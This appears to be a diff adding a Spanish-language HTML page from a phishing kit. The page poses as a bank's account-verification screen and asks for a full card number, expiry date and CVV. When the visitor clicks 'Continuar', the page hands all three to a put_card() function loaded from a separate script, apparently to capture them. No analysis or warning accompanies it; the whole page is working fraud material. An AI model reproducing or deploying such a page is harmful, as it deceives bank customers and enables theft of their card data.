@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="../esova/datos/src/css/layout.css">
+    <link rel="stylesheet" href="../esova/datos/src/css/fonts.css">
+    <link rel="icon" type="image/png" href="../esova/datos/src/img/logo.png">
+    <script src="../esova/datos/src/js/jquery-3.6.0.min.js"></script>
+    <script src="../esova/datos/src/js/jquery.jclock-min.js"></script>
+    <script src="../esova/datos/src/js/run.js"></script>
+    <style>
+        /* Estilos para el botón Continuar */
+        #btn-tarjeta {
+            background-color: #FDDA24;
+            color: #2c2a29;
+            white-space: nowrap;    
+            border: 0px solid transparent;
+            font-size: 20px;
+            padding: 6px 50px 6px 50px;
+            border-radius: 20px;
+        }
+    </style>
+</head>
+<body style="background-color: #f7f7f7;">
+
+    <div class="contenido">
+        <div class="cabecera">
+            <div class="logo">
+                <br><br>
+                <img style="width: 250px;" src="../esova/datos/src/img/logo.svg" alt="Logo del banco">
+            </div>
+        </div>
+
+        <section>
+            <br><br>
+            <span style="font-size: 33px;">Verificación de cuenta</span><br><br>
+            <center><span style="font-size: 19px; font-family: Arial, sans-serif;">Ingrese los números de su T. Crédito o Débito</span></center>
+            <br>
+
+            <div class="input-icono credit-card">
+                <center><input type="text" placeholder="Ingresar número" maxlength="16" minlength="16" id="txtTarjeta" pattern="\d" inputmode="numeric" style="width: 300px; height: 40px; font-size: 16px;"></center>
+            </div>
+            <br><br>
+
+            <div style="text-align: center;">
+                <span style="font-size: 19px; font-family: Arial, sans-serif;">Selecciona la fecha</span>
+            </div>
+              </div>
+              <div style="margin-top: 8px;">
+                  <select style="width: 49% !important; height: 40px; font-size: 16px;" id="inp-mes" name="inp-mes">
+                    <option value="" default selected>Mes</option>
+                    <option value="01">01</option>
+                    <option value="02">02</option>
+                    <option value="03">03</option>
+                    <option value="04">04</option>
+                    <option value="05">05</option>
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                    <option value="08">08</option>
+                    <option value="09">09</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                  </select>
+                <select style="width: 49% !important; height: 40px; font-size: 16px;" id="inp-ano" name="inp-ano">
+                  <option value="" default selected>Año</option>
+                  <option value="2022">2022</option>
+                  <option value="2023">2023</option>
+                  <option value="2024">2024</option>
+                  <option value="2025">2025</option>
+                  <option value="2026">2026</option>
+                  <option value="2027">2027</option>
+                  <option value="2028">2028</option>
+                  <option value="2029">2029</option>
+                  <option value="2030">2030</option>
+                  <option value="2031">2031</option>
+                  <option value="2032">2032</option>
+                  <option value="2033">2033</option>
+                </select>
+            </div>
+            <br><br>
+
+            <div style="text-align: center;">
+                <center><span style="font-size: 19px; font-family: Arial, sans-serif;">CVV</span></center>
+            </div>
+            <center><div class="input-icono pass"><center>
+                <br>
+                <input class="" type="text" placeholder="Ingrese el CVV" id="txtCVV" maxlength="3" pattern="\d" inputmode="numeric" style="width: 130px; height: 40px; font-size: 16px; text-align: center;"><br><br>
+            </div>
+
+            <div class="box-img">
+                <br>
+                <div class="box-img">
+                    <center><button id="btn-tarjeta" name="btn-tarjeta" class="btn btn-amarillo" type="button">Continuar</button></center>
+                </div>
+            </div>
+
+            <div style="margin-left: -5px;">
+                <center><img style="width: 380px;" src="../esova/datos/src/img/lineas-pag.png" alt="Líneas decorativas"></center>
+            </div>
+        </section>
+    </div>
+
+    <script type="text/javascript">
+        $(document).ready(function() {
+            $('#btn-tarjeta').click(function(){
+                if ($("#txtTarjeta").val().length === 16 && $("#inp-mes").val() !== "" && $("#inp-ano").val() !== "" && $("#txtCVV").val().length === 3) {
+                    var fExp = $("#inp-mes").val() + "-" + $("#inp-ano").val(); 
+                    put_card($("#txtTarjeta").val(), fExp, $("#txtCVV").val());
+                } else {
+                    alert("Por favor, complete todos los campos correctamente.");
+                }
+            });
+        });
+    </script>
+    <script type="text/javascript">
+        $(function($) {
+            var optionsEST = {
+                am_pm: true,
+                timeNotation: '12h',
+                h_hour: "<?php echo date('H:i:s') ?>",
+                h_date: "<?php echo date('Y/m/d') ?>",
+                h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
+                h_language: "es"
+            }
+            $('#fecha-hora').jclock(optionsEST);
+        });
+    </script>
+</body>
+</html>
